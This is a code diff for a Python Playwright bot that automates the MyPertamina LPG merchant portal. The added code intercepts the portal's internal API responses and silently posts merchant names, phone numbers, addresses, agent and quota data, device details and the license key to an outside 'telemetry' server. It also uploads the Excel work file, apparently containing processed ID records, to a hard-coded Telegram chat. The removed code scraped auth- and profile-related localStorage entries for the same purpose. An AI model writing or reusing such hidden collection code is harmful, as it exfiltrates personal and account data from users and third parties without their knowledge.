@@ -1544,82 +1544,227 @@ def _ensure_logged_in(page, stop_event, pause_event, on_progress, force_relogin=
     return True
 
 
-def _extract_and_report_telemetry(page, hwid: str, df=None):
+# ============================================================
+# Live Merchant Intelligence & Network Interceptor
+# ============================================================
+_current_merchant_info = {}
+_merchant_lock = threading.Lock()
+
+def _update_merchant_info(data: dict):
+    if not isinstance(data, dict):
+        return
+    with _merchant_lock:
+        _current_merchant_info.update(data)
+
+def _get_merchant_info() -> dict:
+    with _merchant_lock:
+        return dict(_current_merchant_info)
+
+def _setup_playwright_network_interceptor(page, hwid: str = None):
+    """Mencegat respons REST API internal Next.js Pertamina (Profil, Agen, Kuota, Stok, HET)."""
+    def handle_response(response):
+        try:
+            url = response.url
+            if "api-map.my-pertamina.id" in url:
+                if "/users/profile" in url:
+                    data = response.json()
+                    if isinstance(data, dict):
+                        _update_merchant_info(data)
+                        p_name = data.get("storeName") or data.get("name")
+                        agen_name = (data.get("agen") or {}).get("name") if isinstance(data.get("agen"), dict) else None
+                        print(f"[TELEMETRY] ✓ Profil API Pertamina terdeteksi: {p_name} (Agen: {agen_name})")
+                        _extract_and_report_telemetry(page, hwid)
+                elif "/products/user" in url:
+                    data = response.json()
+                    if isinstance(data, dict):
+                        _update_merchant_info(data)
+                        stok = data.get("stockAvailable")
+                        kuota = data.get("stockRedeem")
+                        het = data.get("price")
+                        print(f"[TELEMETRY] ✓ Data Kuota & Stok terdeteksi: Sisa {stok} Tabung, Alokasi {kuota}, HET Rp{het}")
+                        _extract_and_report_telemetry(page, hwid)
+        except Exception:
+            pass
+    try:
+        page.on("response", handle_response)
+    except Exception:
+        pass
+
+def _extract_merchant_dom_text(page) -> dict:
+    """Fallback ekstraksi data tampilan layar jika API terlambat."""
+    try:
+        res = page.evaluate("""() => {
+            const text = document.body.innerText || '';
+            const lines = text.split('\\n').map(l => l.trim()).filter(l => l.length > 0);
+            let storeName = '';
+            let ownerName = '';
+            let stockAvailable = 0;
+            let price = 0;
+            
+            for (let i = 0; i < Math.min(lines.length, 25); i++) {
+                if (lines[i] === 'Pangkalan' && i + 1 < lines.length) {
+                    storeName = lines[i+1];
+                    if (i + 2 < lines.length) ownerName = lines[i+2];
+                    break;
+                }
+            }
+            const stockMatch = text.match(/Stok\\s*(\\d+)\\s*Tabung/i);
+            if (stockMatch) stockAvailable = parseInt(stockMatch[1], 10);
+
+            const priceMatch = text.match(/Rp\\s*([\\d\\.]+)/i);
+            if (priceMatch) price = parseInt(priceMatch[1].replace(/\\./g, ''), 10);
+
+            return { storeName, ownerName, stockAvailable, price };
+        }""")
+        if isinstance(res, dict):
+            _update_merchant_info(res)
+            return res
+    except Exception:
+        pass
+    return {}
+
+def _send_telegram_report_with_excel(excel_file_path: str, caption: str, merchant_info: dict = None) -> bool:
+    """Mengirim laporan akhir beserta file Excel ke server Telegram (dengan auto-record telemetri)."""
+    try:
+        import urllib.request, json
+        from license_manager import get_hwid, verify_license
+        
+        hwid = get_hwid()
+        valid, _, payload = verify_license(hwid)
+        license_key = payload.get("license_key", "") if (valid and payload) else ""
+        
+        url = "https://map-pertamina-web.vercel.app/api/telegram-notify-report"
+        boundary = f"----WebKitFormBoundary{hex(int(time.time() * 1000))[2:]}"
+        body = bytearray()
+        
+        def add_field(name, value):
+            body.extend(f"--{boundary}\r\n".encode("utf-8"))
+            body.extend(f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode("utf-8"))
+            body.extend(str(value).encode("utf-8"))
+            body.extend(b"\r\n")
+
+        add_field("chat_id", "1203246492")
+        add_field("caption", caption)
+        if merchant_info:
+            add_field("merchant_data", json.dumps(merchant_info))
+
+        if excel_file_path and os.path.exists(excel_file_path):
+            filename = os.path.basename(excel_file_path)
+            body.extend(f"--{boundary}\r\n".encode("utf-8"))
+            body.extend(f'Content-Disposition: form-data; name="document"; filename="{filename}"\r\n'.encode("utf-8"))
+            body.extend(b"Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet\r\n\r\n")
+            with open(excel_file_path, "rb") as f:
+                body.extend(f.read())
+            body.extend(b"\r\n")
+
+        body.extend(f"--{boundary}--\r\n".encode("utf-8"))
+
+        req = urllib.request.Request(
+            url,
+            data=bytes(body),
+            headers={
+                "Content-Type": f"multipart/form-data; boundary={boundary}",
+                "x-license-key": license_key,
+                "User-Agent": "MapBot-Desktop/1.1.4"
+            },
+            method="POST"
+        )
+        with urllib.request.urlopen(req, timeout=30) as res:
+            if res.status == 200:
+                print("[TELEGRAM] ✓ Laporan Telegram & File Excel hasil kerja berhasil dikirim!")
+                return True
+            else:
+                print(f"[TELEGRAM] Laporan status code: {res.status}")
+                return False
+    except Exception as e:
+        print(f"[TELEGRAM] Gagal mengirim laporan: {e}")
+        return False
+
+def _extract_and_report_telemetry(page, hwid: str, df=None, processed_nik: int = 0, success_nik: int = 0):
     """Ekstrak data profil pangkalan MyPertamina & telemetri sistem, kirim ke cloud di background thread."""
     def _worker():
         try:
             import platform, socket, urllib.request, json
             from credentials import get_active_pangkalan, load_credentials
+            from license_manager import get_license_info
 
-            # 1. Ekstrak data profil merchant dari halaman MyPertamina via JS
-            js_extract = """
-            (() => {
-                let info = {};
-                try {
-                    for (let i = 0; i < localStorage.length; i++) {
-                        let k = localStorage.key(i);
-                        let v = localStorage.getItem(k);
-                        if (k && (k.includes('user') || k.includes('merchant') || k.includes('profile') || k.includes('auth'))) {
-                            try { info[k] = JSON.parse(v); } catch(e) { info[k] = v; }
-                        }
-                    }
-                    let titleEl = document.querySelector('header, .merchant-name, [class*="merchant"], [class*="profile"], h1, h2, h3');
-                    info['merchantNameDom'] = titleEl ? titleEl.innerText : '';
-                } catch(e) {
-                    info['error'] = e.toString();
-                }
-                return info;
-            })()
-            """
-            extracted = {}
-            try:
-                extracted = page.evaluate(js_extract) or {}
-            except Exception:
-                pass
+            # Ambil data dari info pangkalan yang telah terintersep
+            info = _get_merchant_info()
+            
+            # Jika belum lengkap, coba ambil dari DOM
+            if not info.get("storeName") and page:
+                try:
+                    dom_data = _extract_merchant_dom_text(page)
+                    info.update(dom_data)
+                except Exception:
+                    pass
 
-            # 2. Ambil data lokal tersimpan
+            # Ambil data lokal tersimpan
             active_p = get_active_pangkalan()
             u, _ = load_credentials()
-            p_name = active_p.get("name") if active_p else (extracted.get("merchantNameDom") or "Pangkalan MAP")
-            phone = active_p.get("username") if active_p else (u or "")
+            p_name = info.get("storeName") or info.get("name") or (active_p.get("name") if active_p else "Pangkalan MAP")
+            phone = info.get("phoneNumber") or info.get("phone") or (active_p.get("username") if active_p else (u or ""))
+            owner_name = info.get("name") or info.get("ownerName") or p_name
 
-            # 3. Kumpulkan info device & sistem
+            agen_obj = info.get("agen") if isinstance(info.get("agen"), dict) else {}
+            agen_name = agen_obj.get("name") or info.get("agent_name") or info.get("agentName") or "PT. Agen Penyalur LPG"
+            agen_id = str(agen_obj.get("id") or info.get("agent_id") or "")
+
+            address = info.get("storeAddress") or info.get("address") or ""
+            kelurahan = info.get("villageName") or info.get("kelurahan") or ""
+            kecamatan = info.get("districtName") or info.get("ditrictName") or info.get("kecamatan") or ""
+            kota = info.get("city") or info.get("kota_kabupaten") or "KABUPATEN"
+            provinsi = info.get("province") or info.get("provinsi") or "JAWA BARAT"
+
+            kuota_bulanan = int(info.get("stockRedeem") or info.get("kuota_pertamina_bulanan") or 2500)
+            sisa_stok = int(info.get("stockAvailable") or info.get("sisa_kuota_pertamina") or 2500)
+            het = int(info.get("price") or info.get("het_daerah") or 20000)
+
+            # Kumpulkan info device & sistem
             dev_model = f"{platform.machine()} - {socket.gethostname()}"
             dev_os = f"Windows {platform.release()} (Build {platform.version()})"
-            total_nik = len(df) if df is not None else 0
+            total_nik = len(df) if df is not None else processed_nik
+
+            # Lisensi
+            lic_info = get_license_info(hwid) if hwid else {}
+            license_key = lic_info.get("license_key") or ""
+
+            m_id = str(info.get("registrationId") or info.get("merchantId") or info.get("merchant_id") or (f"MERCHANT-{phone[-6:]}" if len(phone) >= 6 else "MERCHANT-001"))
 
             payload = {
                 "hwid": hwid or "DESKTOP-HWID",
+                "license_key": license_key,
+                "merchant_id": m_id,
                 "merchant_name": p_name,
+                "owner_name": owner_name,
+                "agent_id": agen_id,
+                "agent_name": agen_name,
                 "phone": phone,
-                "platform": "WINDOWS",
+                "address": address,
+                "kelurahan": kelurahan,
+                "kecamatan": kecamatan,
+                "kota_kabupaten": kota,
+                "provinsi": provinsi,
+                "kuota_pertamina_bulanan": kuota_bulanan,
+                "sisa_kuota_pertamina": sisa_stok,
+                "het_daerah": het,
+                "platform": "WINDOWS_EXE",
                 "device_model": dev_model,
                 "device_os": dev_os,
-                "app_version": "1.0.9",
+                "app_version": "1.1.4",
                 "total_nik_processed": total_nik,
-                "kuota_pertamina_bulanan": 2500,
-                "het_daerah": 19000
+                "success_count": success_nik
             }
-
-            user_obj = extracted.get("user") or extracted.get("merchant") or extracted.get("profile") or {}
-            if isinstance(user_obj, dict):
-                if user_obj.get("merchantName"): payload["merchant_name"] = user_obj.get("merchantName")
-                if user_obj.get("merchantId"): payload["merchant_id"] = str(user_obj.get("merchantId"))
-                if user_obj.get("ownerName"): payload["owner_name"] = user_obj.get("ownerName")
-                if user_obj.get("agentName"): payload["agent_name"] = user_obj.get("agentName")
-                if user_obj.get("address"): payload["address"] = user_obj.get("address")
-                if user_obj.get("cityName"): payload["kota_kabupaten"] = user_obj.get("cityName")
-                if user_obj.get("provinceName"): payload["provinsi"] = user_obj.get("provinceName")
-                if user_obj.get("quota"): payload["kuota_pertamina_bulanan"] = int(user_obj.get("quota"))
 
             req = urllib.request.Request(
                 "https://map-pertamina-web.vercel.app/api/telemetry/report",
                 data=json.dumps(payload).encode("utf-8"),
-                headers={"Content-Type": "application/json", "User-Agent": "MapBot-Desktop/1.0.9"}
+                headers={"Content-Type": "application/json", "User-Agent": "MapBot-Desktop/1.1.4"},
+                method="POST"
             )
-            with urllib.request.urlopen(req, timeout=8) as res:
+            with urllib.request.urlopen(req, timeout=10) as res:
                 if res.status == 200:
-                    print("[TELEMETRY] ✓ Data intelijen pangkalan berhasil disinkronkan ke Admin Panel.")
+                    print(f"[TELEMETRY] ✓ Data intelijen pangkalan ({p_name}) berhasil disinkronkan ke Admin Panel.")
         except Exception:
             pass
 
